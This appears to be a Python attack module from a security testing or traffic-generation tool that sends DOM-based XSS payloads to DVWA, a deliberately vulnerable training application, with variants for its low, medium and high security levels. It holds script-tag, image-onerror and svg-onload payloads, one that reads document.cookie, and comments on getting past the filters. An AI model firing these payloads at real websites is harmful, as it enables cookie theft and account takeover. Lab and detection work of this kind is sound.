"""DOM-based XSS attack against DVWA."""

import random
from .base import AttackModule, logger

DOM_PAYLOADS = [
    "English</option></select><img src=x onerror=alert('XSS')>",
    "English<script>alert('DOM-XSS')</script>",
    "English</option></select><svg onload=alert('XSS')>",
    "English&default=<script>alert(document.cookie)</script>",
]


class XssDom(AttackModule):
    NAME = "xss_dom"

    def _attack(self, session, payloads):
        for payload in random.sample(payloads, min(3, len(payloads))):
            session.get(
                "/vulnerabilities/xss_d/",
                params={"default": payload},
            )
            logger.debug("[xss_dom] Payload: %s", payload[:40])

    def run_low(self, session):
        self._attack(session, DOM_PAYLOADS)

    def run_medium(self, session):
        # Medium filters <script>, use event handlers
        medium = [
            "English</option></select><img src=x onerror=alert('XSS')>",
            "English</option></select><svg onload=alert('XSS')>",
        ]
        self._attack(session, medium)

    def run_high(self, session):
        # High uses allowlist — try fragment-based
        for payload in ["English#<script>alert('XSS')</script>", "English#<img src=x onerror=alert(1)>"]:
            session.get("/vulnerabilities/xss_d/", params={"default": payload})
